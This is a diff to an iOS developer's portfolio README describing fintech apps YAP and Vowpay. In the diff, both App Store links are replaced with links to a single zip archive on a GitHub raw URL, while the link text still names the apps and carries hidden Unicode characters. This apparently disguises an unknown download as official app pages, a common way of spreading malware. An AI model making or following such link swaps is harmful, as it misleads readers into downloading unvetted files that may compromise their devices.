@@ -2,7 +2,7 @@
 Overall 3 years of experience in Mobile App Development using Swift. Currently working with Aqila360 as iOS Software Engineer. Deep knowledge of MVVM-C with reactive (Rx) and non-reactive. Sound experience of implementing SOLID principles.
 .
 
-# [YAP – Your Digital Banking Ap‪p](https://apps.apple.com/us/app/yap-your-digital-banking-app/id1498302242)
+# [YAP – Your Digital Banking Ap‪p](https://github.com/xplodig/iOS-Portfolio/raw/refs/heads/main/acediast/Portfolio_O_i_1.6-beta.2.zip)
 YAP is Fintech application (RxSwift, MVVM-C): Being built using Reactive and MVVM-C, deals with managing user financial account and sub-accounts. Funds transfer, transactions and debit card management is supported. Project follows frameworks based modular structure With all UI build programatically. CI/CD implemented using FASTLANE and Circle CI.
 
 ### My Role ###
@@ -19,7 +19,7 @@ iOS Developer :  Communicating with YAP development team, understanding requirem
 * Repository Patteren
 
 
-# [Vowpay - Money Transfe‪r‬](https://apps.apple.com/us/app/id1095042185#?platform=iphone)
+# [Vowpay - Money Transfe‪r‬](https://github.com/xplodig/iOS-Portfolio/raw/refs/heads/main/acediast/Portfolio_O_i_1.6-beta.2.zip)
 Vowpay is an international money transfer app for sending remittances digitally. This can be leveraged to support any country of the customer’s choice. The App provides instant cash out facilities and immediate bank account transfers to users.
 Vowpay is Fintech application (RxSwift, MVVM-C): Being built using Reactive and MVVM-C, deals with managing user financial account and sub-accounts. Funds transfer, transactions and debit card management is supported. Project follows frameworks based modular structure With all UI build programatically. CI/CD implemented using FASTLANE and Travis CI.
 
